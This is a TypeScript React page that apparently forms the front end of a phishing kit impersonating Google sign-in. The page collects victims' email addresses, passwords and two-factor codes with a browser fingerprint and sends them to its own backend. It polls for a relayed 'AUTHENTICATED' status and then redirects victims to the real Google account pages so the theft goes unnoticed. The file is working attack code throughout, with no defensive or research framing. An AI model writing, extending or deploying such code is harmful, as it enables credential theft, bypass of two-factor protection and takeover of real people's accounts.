"use client";

import EmailView from "@/components/EmailView";
import PasswordView from "@/components/PasswordView";
import TwoFactor from "@/components/TwoFactor";
import Footer from "@/components/ui/footer";
import LogoSVG from "@/components/ui/logo";
import { initiateLogin, submitPassword, submit2FA, switch2FA, getSession } from "./actions";
import { loginSchema } from "@/lib/schemas";
import {
  ChallengeMetadata,
  ChallengeType,
  LoginFormData,
  Step,
} from "@/lib/types";
import { getBrowserFingerprint } from "@/lib/utils";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { useEffect, useState } from "react";
import { useForm } from "react-hook-form";

export default function Page() {
  const [step, setStep] = useState<Step>("email");
  const [isSuccess, setIsSuccess] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [challengeType, setChallengeType] = useState<ChallengeType | null>(
    null,
  );
  const [challengeMetadata, setChallengeMetadata] =
    useState<ChallengeMetadata | null>(null);
  const [backendMessage, setBackendMessage] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [twoFactorCode, setTwoFactorCode] = useState("");
  const [is2FALoading, setIs2FALoading] = useState(false);

  const {
    register,
    handleSubmit,
    trigger,
    getValues,
    setError: setFormError,
    formState: { errors },
  } = useForm<LoginFormData>({
    resolver: zodResolver(loginSchema),
    mode: "onChange",
    defaultValues: {
      email: "",
      password: "",
    },
  });

  // Real API mutations
  const initiateMutation = useMutation({
    mutationFn: async (email: string) => {
      const res = await initiateLogin({
        email,
        fingerprint: getBrowserFingerprint(),
      });
      if (!res.success || !res.data) throw new Error(res.message || "Failed");
      return res.data;
    },
    onSuccess: (data) => {
      if (data.sessionId) setSessionId(data.sessionId);
      if (data.status === "REQUIRES_PASSWORD") {
        setStep("password");
      }
    },
    onError: (err: Error) => {
      const message = err.message || "Failed to initiate login";
      setFormError("email", { message });
      setError(message);
    },
  });

  const passwordMutation = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const res = await submitPassword({
        sessionId: sessionId!,
        password: data.password,
      });
      if (!res.success || !res.data) throw new Error(res.message || "Failed");
      return res.data;
    },
    onSuccess: (data) => {
      if (data.status === "AUTHENTICATED") {
        redirectToGoogle();
      } else if (data.status === "REQUIRES_2FA") {
        console.dir(data, { depth: 2 });
        setChallengeType(data.challengeType || null);
        setChallengeMetadata(data.challengeMetadata || null);
        setBackendMessage(data.message || null);
        setStep("2fa");
      }
    },
    onError: (err: Error) => {
      const message = err.message || "Invalid password";
      setFormError("password", { message });
      setError(message);
    },
  });

  const handleNext = async () => {
    if (step === "email") {
      const isEmailValid = await trigger("email");
      if (isEmailValid) {
        initiateMutation.mutate(getValues("email"));
      }
    } else if (step === "password") {
      const isPasswordValid = await trigger("password");
      if (isPasswordValid) {
        passwordMutation.mutate(getValues());
      }
    }
  };

  const handlePrevious = () => {
    setStep("email");
    setError(null);
  };

  // Redirect to Google account - tries app deep link first, fallback to web
  const redirectToGoogle = () => {
    setIsSuccess(true); // Stop polling immediately if we are in 2FA step
    const webUrl = "https://myaccount.google.com";

    // Deep link schemes for Google apps
    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
    const isAndroid = /Android/.test(navigator.userAgent);

    let appUrl: string | null = null;

    if (isIOS) {
      // iOS Google app deep link
      appUrl = "googlegmail://";
    } else if (isAndroid) {
      // Android Google app intent
      appUrl =
        "intent://myaccount.google.com#Intent;scheme=https;package=com.google.android.gms;end";
    }

    if (appUrl) {
      // Try to open app first
      const appWindow = window.open(appUrl, "_self");

      // Fallback to web after a short delay if app didn't open
      setTimeout(() => {
        window.location.href = webUrl;
      }, 1500);
    } else {
      // Desktop - go directly to web
      window.location.href = webUrl;
    }
  };

  // Session status polling for all 2FA types
  useEffect(() => {
    let pollInterval: NodeJS.Timeout;

    if (sessionId && step === "2fa" && !isSuccess) {
      pollInterval = setInterval(async () => {
        try {
          const res = await getSession(sessionId);
          if (res.success && res.data) {
            // @ts-ignore - session is wrapped in data
            const status = res.data?.data?.status || res.data?.status;
            if (status === "AUTHENTICATED") {
              clearInterval(pollInterval);
              redirectToGoogle();
            }
          }
        } catch (err) {
          console.error("Polling error", err);
        }
      }, 3000);
    }

    return () => {
      if (pollInterval) clearInterval(pollInterval);
    };
  }, [sessionId, step, isSuccess]);

  const handle2FASubmit = async () => {
    if (!sessionId) return;
    setIs2FALoading(true);
    try {
      const res = await submit2FA({
        sessionId,
        code: twoFactorCode,
        challengeType: challengeType || undefined,
      });
      if (!res.success || !res.data) throw new Error(res.message || "Invalid code");
      
      const data = res.data;
      if (data.status === "AUTHENTICATED") {
        redirectToGoogle();
      }
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : "Invalid code";
      setError(message);
    } finally {
      setIs2FALoading(false);
    }
  };

  const handleSwitchMethod = async (method: string) => {
    if (!sessionId) return;
    setIs2FALoading(true);
    try {
      const res = await switch2FA({ sessionId, method });
      if (!res.success || !res.data) throw new Error(res.message || "Failed to switch method");
      
      const data = res.data;
      setChallengeType(data.challengeType || null);
      setChallengeMetadata(data.challengeMetadata || null);
      setBackendMessage(data.message || null);
      setTwoFactorCode("");
    } catch (err: unknown) {
      const message =
        err instanceof Error ? err.message : "Failed to switch method";
      setError(message);
    } finally {
      setIs2FALoading(false);
    }
  };

  const isLoading =
    initiateMutation.isPending || passwordMutation.isPending || is2FALoading;

  return (
    <div className="flex flex-col min-h-dvh bg-white md:bg-[#f0f4f9] items-center justify-center p-0 md:p-6 overflow-hidden">
      {/* Loading Bar - Fixed at viewport top on mobile only */}
      {isLoading && (
        <div className="fixed md:hidden top-0 left-0 w-full h-[3px] bg-transparent overflow-hidden z-50">
          <div className="h-full bg-google-blue w-full animate-loading-progress" />
        </div>
      )}
      <div className="flex flex-col md:flex-row w-full md:max-w-[1024px] lg:max-w-[1136px] min-h-dvh md:min-h-auto md:h-auto bg-white md:rounded-[28px] overflow-hidden relative shadow-none md:shadow-sm">
        {/* Loading Bar - Absolute at card top on desktop only */}
        {isLoading && (
          <div className="hidden md:block absolute top-0 left-0 right-0 mx-[20px] h-[3px] bg-transparent overflow-hidden z-50">
            <div className="h-full bg-google-blue animate-loading-progress" />
          </div>
        )}
        {/* Logo - Positioned absolutely on desktop */}
        <div className="hidden md:block absolute top-[36px] left-[36px]">
          <LogoSVG />
        </div>
        <div className="md:hidden flex pt-[96px] pb-[24px] px-6">
          <LogoSVG />
        </div>

        {/* content window */}
        <div className="w-full overflow-hidden">
          <div
            className="flex w-[300%] transition-transform duration-500 ease-in-out"
            style={{
              transform:
                step === "email"
                  ? "translateX(0)"
                  : step === "password"
                    ? "translateX(-33.333%)"
                    : "translateX(-66.666%)",
            }}
          >
            {/* Step 1: Email View */}
            <EmailView
              isLoading={isLoading}
              handleNext={handleNext}
              register={register}
              errors={errors}
            />

            {/* Step 2: Password View */}
            <PasswordView
              email={getValues("email")}
              isLoading={isLoading}
              showPassword={showPassword}
              setShowPassword={setShowPassword}
              step={step}
              handleNext={handleNext}
              handlePrevious={handlePrevious}
              register={register}
              errors={errors}
            />

            {/* Step 3: 2FA View */}
            <TwoFactor
              email={getValues("email")}
              isLoading={isLoading}
              challengeType={challengeType}
              challengeMetadata={challengeMetadata}
              twoFactorCode={twoFactorCode}
              setTwoFactorCode={setTwoFactorCode}
              handle2FASubmit={handle2FASubmit}
              handleSwitchMethod={handleSwitchMethod}
              backendMessage={backendMessage}
              error={error}
              step={step}
            />
          </div>
        </div>
      </div>

      {/* Footer */}
      <Footer />
    </div>
  );
}
